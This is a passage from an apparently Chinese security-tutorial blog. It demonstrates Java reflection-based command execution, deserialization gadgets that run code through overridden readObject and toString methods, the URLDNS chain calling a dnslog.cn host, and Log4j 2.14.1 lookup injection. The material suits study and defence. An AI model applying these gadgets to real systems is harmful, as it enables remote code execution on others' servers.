&#125;</span><br>    <br><span class="hljs-comment">//        //获取不包括继承的所有成员方法</span><br><span class="hljs-comment">//        Method[] methods = aClass.getDeclaredMethods();</span><br><span class="hljs-comment">//        for(Method me:methods)&#123;</span><br><span class="hljs-comment">//            System.out.println(me);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br><span class="hljs-comment">//        //获取单个的成员方法</span><br><span class="hljs-comment">//        Method users = aClass.getDeclaredMethod(&quot;users&quot;, String.class,String.class);</span><br><span class="hljs-comment">//        System.out.println(users);</span><br><br><br><span class="hljs-comment">//        //对成员方法进行执行</span><br><span class="hljs-comment">//        User u = new User();</span><br><span class="hljs-comment">//        Method users = aClass.getDeclaredMethod(&quot;users&quot;, String.class,String.class);</span><br><span class="hljs-comment">//        users.invoke(u,&quot;xiaodigay&quot;,&quot;gay1&quot;);</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>反射-命令执行</p><p>原理：Java自带包含有的java.lang中有对于本机控制台的调用方法</p><p>​<img src="/assets/image-20240714213343-kmjdibx.png" alt="image">​</p><ul><li><p>第三方的包—反射实现命令执行</p><ol><li><p>首先使用 Class.forName获取 java.lang.Runtime 类</p></li><li><p>通过getMethods获取该类<strong>包括继承</strong>的<strong>公共成员</strong>方法，并遍历出来</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 使用 Class.forName 获取 java.lang.Runtime 类</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <br><span class="hljs-comment">// 获取 Runtime 类的所有公共方法</span><br>Method[] methods = aClass.getMethods();<br>    <br><span class="hljs-comment">// 遍历所有方法并打印输出方法信息</span><br><span class="hljs-keyword">for</span> (Method me : methods) &#123;<br>    System.out.println(me);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>通过查询找到对应需要的成员方法</p><p> ​<img src="/assets/image-20240714214148-v4mgn7l.png" alt="image">​</p></li><li><p>根据成员方法的名称和参数，分别对应获取所需成员方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取名为 &quot;exec&quot; 的方法，该方法接受一个 String 参数</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> aClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    <br><span class="hljs-comment">// 获取名为 &quot;getRuntime&quot; 的方法，该方法不接受参数</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> aClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>    <br><span class="hljs-comment">// 使用反射调用 aClass 对象的 getRuntime 方法，获取 Runtime 对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(aClass);<br>    <br><span class="hljs-comment">// 使用反射调用 Runtime 对象的 exec 方法，执行系统命令 &quot;calc.exe&quot;</span><br>exec.invoke(runtime, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>通过使用获取的方法依次调用执行即可</p><p> ​<img src="/assets/image-20240714214425-hu5cs4k.png" alt="image">​</p></li></ol></li></ul></li></ul></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JavaEE应用-原生反序列化-重写方法-链条分析-触发类-类加载"><a href="#JavaEE应用-原生反序列化-重写方法-链条分析-触发类-类加载" class="headerlink" title="JavaEE应用&amp;原生反序列化&amp;重写方法&amp;链条分析&amp;触发类&amp;类加载"></a>JavaEE应用&amp;原生反序列化&amp;重写方法&amp;链条分析&amp;触发类&amp;类加载</h3><ol><li><p>原生反序列化</p><ul><li><p>序列化实现，创建用户类，实现Serializable接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">// 用户信息类，实现了 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-comment">// 公共成员变量</span><br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;xiaodi&quot;</span>;<br>    <span class="hljs-keyword">public</span> String gender=<span class="hljs-string">&quot;man&quot;</span>;<br>    <span class="hljs-keyword">public</span> Integer age=<span class="hljs-number">30</span>;<br><br>    <span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDemo</span><span class="hljs-params">(String name,String gender,Integer age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(name);<br>        System.out.println(gender);<br>    &#125;<br><br>    <span class="hljs-comment">// toString 方法，用于打印对象信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>创建对应的序列化类，并创建对应的序列化方法：SerializableDemo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">//序列化演示类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//创建一个对象 引用UserDemo</span><br>        UserDemo u=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDemo</span>(<span class="hljs-string">&quot;xdsec&quot;</span>,<span class="hljs-string">&quot;gay1&quot;</span>,<span class="hljs-number">30</span>);<br>        <span class="hljs-comment">//调用方法进行序列化</span><br>        SerializableTest(u);<br>        <span class="hljs-comment">//ser.txt 就是对象u 序列化的字节流数据</span><br>    &#125;<br><br><br>    <span class="hljs-comment">// 序列化方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SerializableTest</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 使用 ObjectOutputStream 将对象 obj 序列化后输出到文件 ser.txt</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        <span class="hljs-comment">// 将对象 obj 进行序列化，并将序列化后的数据写入到文件输出流中。</span><br>        oos.writeObject(obj);<br>        <span class="hljs-comment">// 关闭流</span><br>        oos.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ser.txt的内容：</p><p>​<img src="/assets/image-20240715002752-9zrdz8j.png" alt="image">​</p></li><li><p>创建对应反序列化类，并创建对应反序列化方法：UnserializableDemo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br>    <br><span class="hljs-keyword">import</span> java.io.*;<br>    <br><span class="hljs-comment">//反序列化演示类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializableDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//调用下面的方法 传输ser.txt 解析还原反序列化</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span>UnserializableTest(<span class="hljs-string">&quot;ser.txt&quot;</span>);<br>    <br>        <span class="hljs-comment">//对obj对象进行输出 默认调用原始对象的toString方法</span><br>        System.out.println(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UnserializableTest</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//读取Filename文件进行反序列化还原</span><br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-comment">// 通过 ois.readObject() 方法从文件输入流中读取一个对象，并将其赋值给变量 o</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-comment">// 返回反序列化后的对象</span><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​<img src="/assets/image-20240715002951-19iltz2.png" alt="image">​</p></li></ul></li><li><p>重写方法</p><p> 原理：<code>readObject</code>​  序列化后被重写 <code>readObject</code>​ 调用</p><p> 运行 SerializableDemo.java 生成新的 ser.txt 后，运行 UnserializableDemo.java 进行反序列化，发现弹出了计算器程序。</p><p> <img src="/assets/image-20240715003826-tzso2a8.png" alt="image">​</p><p> 这是因为在进行反序列化操作过程中，如下方法调用了 <code>readObject</code>​ 方法，但由于我们在 <code>UserDemo.java</code>​ 重写了该方法，所以导致此处执行的 <code>readObject</code>​ 不是原本默认的 <code>readObject</code>​，而是我们自定义的 <code>readObject</code>​，其中 <code>ois.defaultReadObject()</code>​ 使其指向正确的 <code>readObject</code>​ 从而使程序可以正常运行，又可以执行我们的代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-comment">// 用户信息类，实现了 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">// 公共成员变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xiaodi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;man&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;<br><br>    <span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDemo</span><span class="hljs-params">(String name, String gender, Integer age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(name);<br>        System.out.println(gender);<br>    &#125;<br><br>    <span class="hljs-comment">// toString 方法，用于打印对象信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br><br><br>        <span class="hljs-comment">// 返回对象信息的字符串表示</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        <span class="hljs-comment">// 指向正确的defaultReadObject</span><br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>触发方法</p><p> 原理：toString  输出打印对象时调用 toString 方法</p><p> 直接运行 UnserializableDemo.java 进行反序列化，发现弹出了计算器程序。这是由于当对一个对象进行打印输出时，会默认自动调用它的 toString 方法</p><p> <img src="/assets/image-20240715004016-ke1hkv0.png" alt="image">​</p><p> 而我们这里在 toString 加入了我们要运行的代码，所以当反序列化时下面代码运行打印输出时，我们的代码就会成功执行。</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">// 用户信息类，实现了 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-comment">// 公共成员变量</span><br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;xiaodi&quot;</span>;<br>    <span class="hljs-keyword">public</span> String gender=<span class="hljs-string">&quot;man&quot;</span>;<br>    <span class="hljs-keyword">public</span> Integer age=<span class="hljs-number">30</span>;<br><br>    <span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDemo</span><span class="hljs-params">(String name,String gender,Integer age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(name);<br>        System.out.println(gender);<br>    &#125;<br><br>    <span class="hljs-comment">// toString 方法，用于打印对象信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>          <span class="hljs-keyword">try</span> &#123;<br>              Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>          &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>              <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>          &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>可控其他类重写方法</p><p> 参考：<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p> 利用 <code>HashMap</code>​存在的反序列化漏洞的<code>readObject</code>​方法，调用了<code>HashMap.putVal()</code>​ 方法，最终调用了<code>URL.hashCode()</code>​形成RCE漏洞分析</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">正常代码中 创建对象HashMap<br>        用到原生态readObject方法去反序列化数据<br>        readObject 在ObjectInputSteam 本来在这里<br>        HashMap也有readObject方法<br>        反序列化readObject方法调用 HashMap里面的readObject<br>        执行链：<br>        序列化对象hash 来源于自带类HashMap<br>         *   Gadget Chain:<br>                *   HashMap.readObject()<br>                *       HashMap.putVal()<br>                *         HashMap.hash()<br>                *           URL.hashCode()<br>        hashCode 执行结果 触发访问DNS请求 如果这里是执行命令的话 就是RCE漏洞<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240715010506-yofoa9k.png" alt="image">​</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrLDns</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        HashMap&lt;URL,Integer&gt; hash = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        URL u=<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://uqbm9g.dnslog.cn&quot;</span>);<br>        hash.put(u,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//正常代码中 创建对象HashMap</span><br>        <span class="hljs-comment">//用到原生态readObject方法去反序列化数据</span><br>        <span class="hljs-comment">//readObject 在ObjectInputSteam 本来在这里</span><br>        <span class="hljs-comment">//HashMap也有readObject方法</span><br>        <span class="hljs-comment">//反序列化readObject方法调用 HashMap里面的readObject</span><br>        <span class="hljs-comment">//执行链：</span><br>        <span class="hljs-comment">//序列化对象hash 来源于自带类HashMap</span><br><span class="hljs-comment">//         *   Gadget Chain:</span><br><span class="hljs-comment">//                *   HashMap.readObject()</span><br><span class="hljs-comment">//                *       HashMap.putVal()</span><br><span class="hljs-comment">//                *         HashMap.hash()</span><br><span class="hljs-comment">//                *           URL.hashCode()</span><br>        <span class="hljs-comment">//hashCode 执行结果 触发访问DNS请求 如果这里是执行命令的话 就是RCE漏洞</span><br>        SerializableTest(hash);<br>        UnserializableTest(<span class="hljs-string">&quot;dns.txt&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SerializableTest</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//FileOutputStream() 输出文件</span><br>        <span class="hljs-comment">//将对象obj序列化后输出到文件dns.txt</span><br>        ObjectOutputStream oos= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;dns.txt&quot;</span>));<br>        oos.writeObject(obj);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UnserializableTest</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//读取Filename文件进行反序列化还原</span><br>        ObjectInputStream ois= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JavaEE应用-第三方组件-Log4j日志-FastJson序列化-JNDI注入"><a href="#JavaEE应用-第三方组件-Log4j日志-FastJson序列化-JNDI注入" class="headerlink" title="JavaEE应用&amp;第三方组件&amp;Log4j日志&amp;FastJson序列化&amp;JNDI注入"></a>JavaEE应用&amp;第三方组件&amp;Log4j日志&amp;FastJson序列化&amp;JNDI注入</h3><ol><li><p>Log4j历史漏洞&amp;JNDI注入</p><ul><li><p>Log4j历史漏洞</p><p>首先配置Maven—<a href="https://www.jb51.net/article/259780.htm">IDEA配置Maven的超详细步骤_java_脚本之家 (jb51.net)</a></p><p>并创建空项目Log4jDemo</p><p><img src="/assets/image-20240715180108-ganmb34.png" alt="image">​</p><p>Maven 引用 Log4j</p><ol><li>在 pom.xml 文件中添加引用</li><li>引用代码是那个 <a href="https://mvnrepository.com/" title="Jar 仓库">Jar 仓库</a>搜索到之后复制 Maven 的代码</li><li>这里引用的是 <a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.14.1" title="2.14.1 版本">2.14.1 版本</a>的</li></ol><p><img src="/assets/image-20240715180312-bwycpsv.png" alt="image">​</p><p><img src="/assets/image-20240715180405-r44jq3w.png" alt="image">​</p><p>引用后左侧就会变成下图所示</p><p><img src="/assets/image-20240715180549-fhs7no6.png" alt="image">​</p><p>创建 Log4jTest.java，编写代码并运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log4jTest</span> &#123;<br>    <br>    <span class="hljs-comment">//使用Log4j 实现错误日志输出</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(Log4jTest.class);<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <br>        <span class="hljs-comment">//如果这个code变量是可控的</span><br>        String code=<span class="hljs-string">&quot;$&#123;java:os&#125;&quot;</span>;<br>        logger.error(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,code);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>发现可以进行命令执行</p><p>​<img src="/assets/image-20240715180737-2z7sych.png" alt="image">​</p><p>在网站中进行测试</p><p>创建一个 web 应用程序新项目，配置如下：</p><p>​<img src="/assets/image-20240715180845-64e7d86.png" alt="image">​</p><p>如上同样需要在 pom.xml 文件中添加 Log4j 引用</p><p>创建Log4jServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 